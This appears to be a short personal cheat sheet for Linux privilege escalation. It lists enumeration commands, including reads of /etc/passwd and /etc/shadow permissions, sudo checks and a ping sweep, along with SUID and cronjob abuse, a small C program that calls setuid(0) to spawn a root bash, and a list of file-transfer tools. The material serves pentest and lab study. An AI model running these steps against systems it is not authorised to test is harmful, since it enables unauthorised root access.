  
# Enum  
## Quick Enum
    hostname; ip addr;    
    whoami; id   
    uname -r   
    cat /etc/passwd | grep /bin/bash   
    ls -l /etc/shadow   
    sudo -l  
    
    netstat -antp; arp -a 
    for x in {1 .. 254};do (ping -c 1 l.l.l.$x | grep "bytes from" &); done | cut -d " "
## Scripts
    run lse.sh, linpeas.sh 
## Checklists
[Linux Priv Esc Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)    
  
# Exploits
## Cronjobs    
look for scripts you can write to or exploit using gtfobins
    cat /etc/cronjobs   
    crontab -l    
## SUID Binaries
    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \;  2>/dev/null               
    ps aux | grep “^root”                   
### Custom Executable
    int main(){
        setuid(0);
        system("/bin/bash -p");
    }
## Kernel Exploits 
    uname -a  
    cat /etc/*-release
No compilers on host: use gcc-multilib -m32 (32 bit OS) or -m64 (64 bit OS) then upload 
# File Transfer 
    which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
    

# Resources
## Cheat Sheets 
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

## Learn More
